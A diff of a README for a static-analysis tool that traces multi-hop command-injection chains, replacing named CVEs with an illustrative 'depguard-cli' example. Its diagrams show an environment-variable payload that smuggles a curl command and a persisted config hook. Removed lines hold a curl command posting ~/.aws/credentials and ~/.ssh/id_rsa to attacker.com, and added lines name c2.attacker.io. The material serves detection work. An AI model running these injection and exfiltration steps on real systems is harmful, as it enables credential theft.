@@ -2,7 +2,7 @@
 
 > **This project is an attempt to codify and operationalize the vulnerability chain reasoning capabilities demonstrated by Anthropic's Claude AI model.** Claude can reason across multi-hop exploit paths — tracing tainted data through session boundaries, across file systems, and through execution contexts — in a way that most static analysis tools cannot. This engine takes that reasoning and turns it into a deterministic, auditable, pattern-driven static analysis system.
 >
-> Built by reverse-engineering the analysis Claude performed on three chained CVEs in the Claude Code CLI (CVE-2026-35020, CVE-2026-35021, CVE-2026-35022). See [examples/real-world-case-study.md](examples/real-world-case-study.md) for the full breakdown.
+> The detection patterns and chain mechanics are validated against a real-world illustrative example. See [examples/real-world-case-study.md](examples/real-world-case-study.md) for the full breakdown.
 
 ---
 
@@ -22,8 +22,8 @@ The following diagram represents the real-world CVE chain this engine was design
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────────┐
-│                    VULNERABILITY CHAIN — CVE-2026-35020/21/22                   │
-│                         Claude Code CLI (Anthropic)                             │
+│              VULNERABILITY CHAIN — depguard-cli (Illustrative Example)          │
+│              DG-2024-001 → DG-2024-003 | CWE-78 | Score: 10.0 Critical         │
 └─────────────────────────────────────────────────────────────────────────────────┘
 
   SESSION A (Attacker-controlled environment)
@@ -31,64 +31,65 @@ The following diagram represents the real-world CVE chain this engine was design
 
   [ATTACKER]
       │
-      │  Sets: TERMINAL='touch /tmp/pwned; echo sk-ant-fake'
+      │  Sets: DG_REGISTRY='https://registry.npmjs.org"; curl ... #'
       │        via .env file, CI/CD variable, or Docker directive
       ▼
   ┌─────────────────────────────────────┐
-  │  SOURCE: process.env.TERMINAL       │  ← CVE-2026-35020
-  │  which.ts:12                        │    CWE-78 | CVSS 8.4
+  │  SOURCE: process.env.DG_REGISTRY    │  ← DG-2024-001
+  │  resolver.ts:6                      │    CWE-78 | CVSS 8.2
   └────────────────┬────────────────────┘    No user interaction
                    │ DIRECT_FLOW
                    ▼
   ┌─────────────────────────────────────┐
-  │  PASSTHROUGH: `which ${command}`    │
+  │  PASSTHROUGH: `curl -s "${…}/…"`    │
   │  Template literal (taint preserved) │
   └────────────────┬────────────────────┘
                    │ TRANSFORM_FLOW
                    ▼
   ┌─────────────────────────────────────┐
-  │  SINK: execa(cmd, {shell:true})     │  ← Initial code execution
-  │  which.ts:44                        │    Payload runs here
+  │  SINK: execSync(cmd)                │  ← Initial code execution
+  │  resolver.ts:10                     │    Payload runs here
   └────────────────┬────────────────────┘
                    │ Payload executes
                    ▼
   ┌─────────────────────────────────────┐
   │  STORE: fs.writeFileSync(           │  ← Persistence
-  │    '~/.claude/settings.json',       │    Tainted config written
-  │    { apiKeyHelper: 'curl ...' }     │
+  │    '~/.depguard/config.json',       │    Tainted config written
+  │    { preScanHook: 'curl ...' }      │
   │  )                                  │
   └────────────────┬────────────────────┘
                    │
   ════════════════ │ ═══════════════════ SESSION BOUNDARY ═══════════════════════
                    │  STORED_FLOW (cross-session)
-  SESSION B (Next time victim runs claude)
-  ════════════════════════════════════════
+  SESSION B (every subsequent depguard-cli scan)
+  ════════════════════════════════════════════════
                    │
                    ▼
   ┌─────────────────────────────────────┐
-  │  LOAD: JSON.parse(                  │  ← Config loaded next session
-  │    readFileSync('settings.json')    │    All fields inherit taint
+  │  LOAD: JSON.parse(                  │  ← Config loaded at startup
+  │    readFileSync('config.json')      │    All fields inherit taint
   │  )                                  │
   └────────────────┬────────────────────┘
                    │ STORED_FLOW
                    ▼
   ┌─────────────────────────────────────┐
-  │  PASSTHROUGH: config.apiKeyHelper   │
+  │  PASSTHROUGH: config.preScanHook    │
   │  Tainted field from loaded config   │
   └────────────────┬────────────────────┘
                    │ CALL_FLOW
                    ▼
   ┌─────────────────────────────────────┐
-  │  SINK: execa(apiKeyHelper,          │  ← CVE-2026-35022
-  │    {shell:true})                    │    CWE-78 | CVSS 9.9 (CI/CD)
-  │  auth.ts:88                         │    Runs BEFORE auth validates
+  │  SINK: execSync(config.preScanHook) │  ← DG-2024-003
+  │  config.ts:24                       │    CWE-78 | CVSS 9.1 (CI/CD)
+  │                                     │    Runs BEFORE scan begins
   └────────────────┬────────────────────┘
                    │ Exfiltration executes
                    ▼
   ┌─────────────────────────────────────┐
-  │  EXFIL: curl -X POST attacker.com   │
-  │  -d "$(cat ~/.aws/credentials)"     │  ← AWS keys, SSH keys,
-  │  -d "$(cat ~/.ssh/id_rsa)"          │    API tokens, MEMORY.md
+  │  EXFIL: curl POST c2.attacker.io    │
+  │  ~/.aws/credentials                 │  ← AWS keys, SSH keys,
+  │  ~/.ssh/id_rsa                      │    CI/CD secrets, env vars
+  │  process.env (all CI secrets)       │
   └─────────────────────────────────────┘
 
   CHAIN SCORE: 10.0 (Critical)  |  Hops: 6  |  Session-crossing: YES
@@ -97,13 +98,13 @@ The following diagram represents the real-world CVE chain this engine was design
 
 ```mermaid
 flowchart TD
-    A["🔴 SOURCE\nprocess.env.TERMINAL\nwhich.ts:12"] -->|DIRECT_FLOW| B["🟡 PASSTHROUGH\n\`which \${command}\`\nwhich.ts:42"]
-    B -->|TRANSFORM_FLOW| C["🔴 SINK ①\nexeca(cmd, shell:true)\nwhich.ts:44\nCVE-2026-35020"]
-    C -->|Payload executes| D["🟠 STORE\nfs.writeFileSync\n~/.claude/settings.json\napiKeyHelper: 'curl ...'"]
-    D -->|"STORED_FLOW\n⚡ SESSION BOUNDARY ⚡"| E["🟠 LOAD\nJSON.parse readFileSync\nsettings.json\nSession B"]
-    E -->|STORED_FLOW| F["🟡 PASSTHROUGH\nconfig.apiKeyHelper\ntaint inherited"]
-    F -->|CALL_FLOW| G["🔴 SINK ②\nexeca(apiKeyHelper, shell:true)\nauth.ts:88\nCVE-2026-35022"]
-    G -->|Exfiltration| H["💀 EXFIL\ncurl POST attacker.com\n~/.aws/credentials\n~/.ssh/id_rsa"]
+    A["🔴 SOURCE\nprocess.env.DG_REGISTRY\nresolver.ts:6"] -->|DIRECT_FLOW| B["🟡 PASSTHROUGH\n\`curl -s \"\${registry}/…\"\`\nresolver.ts:10"]
+    B -->|TRANSFORM_FLOW| C["🔴 SINK ①\nexecSync(cmd)\nresolver.ts:10\nDG-2024-001"]
+    C -->|Payload executes| D["🟠 STORE\nfs.writeFileSync\n~/.depguard/config.json\npreScanHook: 'curl ...'"]
+    D -->|"STORED_FLOW\n⚡ SESSION BOUNDARY ⚡"| E["🟠 LOAD\nJSON.parse readFileSync\nconfig.json\nSession B"]
+    E -->|STORED_FLOW| F["🟡 PASSTHROUGH\nconfig.preScanHook\ntaint inherited"]
+    F -->|CALL_FLOW| G["🔴 SINK ②\nexecSync(config.preScanHook)\nconfig.ts:24\nDG-2024-003"]
+    G -->|Exfiltration| H["💀 EXFIL\ncurl POST c2.attacker.io\n~/.aws/credentials\n~/.ssh/id_rsa"]
 
     style A fill:#ff4444,color:#fff
     style C fill:#ff4444,color:#fff
@@ -178,11 +179,11 @@ The engine was initially designed and validated against a real 3-CVE chain in th
 
 Full case study: [examples/real-world-case-study.md](examples/real-world-case-study.md)
 
-| CVE | Component | Type | CVSS | Chain Role |
+| ID | Component | Type | CVSS | Chain Role |
 |---|---|---|---|---|
-| CVE-2026-35020 | `which.ts` | Env var → shell exec | 8.4 | Initial foothold |
-| CVE-2026-35021 | `promptEditor.ts` | File path → cmd substitution | 7.8 | Lateral movement |
-| CVE-2026-35022 | `auth.ts` | Config helper → credential exfil | 9.9 | Persistence + exfil |
+| DG-2024-001 | `resolver.ts` | Env var → shell exec | 8.2 | Initial foothold |
+| DG-2024-002 | `editor.ts` | File path → cmd substitution | 7.6 | Lateral movement |
+| DG-2024-003 | `config.ts` | Config hook → credential exfil | 9.1 | Persistence + exfil |
 
 ---
 
@@ -199,16 +200,15 @@ CHAIN DETECTED ─────────────────────�
   User interaction:   NOT REQUIRED
   Zero-day:           NO (matched CVE pattern)
 
-  Step 1  SOURCE       process.env.TERMINAL          which.ts:12
-  Step 2  PASSTHROUGH  `which ${command}`             which.ts:42
-  Step 3  SINK         execa({shell:true})            which.ts:44
-  Step 4  STORE        fs.writeFileSync settings.json [Session A]
-  Step 5  LOAD         JSON.parse readFileSync        [Session B]
-  Step 6  SINK         execa(apiKeyHelper)            auth.ts:88
+  Step 1  SOURCE       process.env.DG_REGISTRY              resolver.ts:6
+  Step 2  PASSTHROUGH  `curl -s "${registry}/…"`             resolver.ts:10
+  Step 3  SINK         execSync(cmd)                         resolver.ts:10
+  Step 4  STORE        fs.writeFileSync config.json          [Session A]
+  Step 5  LOAD         JSON.parse readFileSync               [Session B]
+  Step 6  SINK         execSync(config.preScanHook)          config.ts:24
 
-  Fix: Use args array instead of shell strings. Validate apiKeyHelper
-       against allowlist before execution.
-  Refs: CVE-2026-35020, CVE-2026-35022
+  Fix: Use args array instead of shell strings. Validate preScanHook
+       against executable path allowlist before running.
 ─────────────────────────────────────────────────────────────────
 ```
 
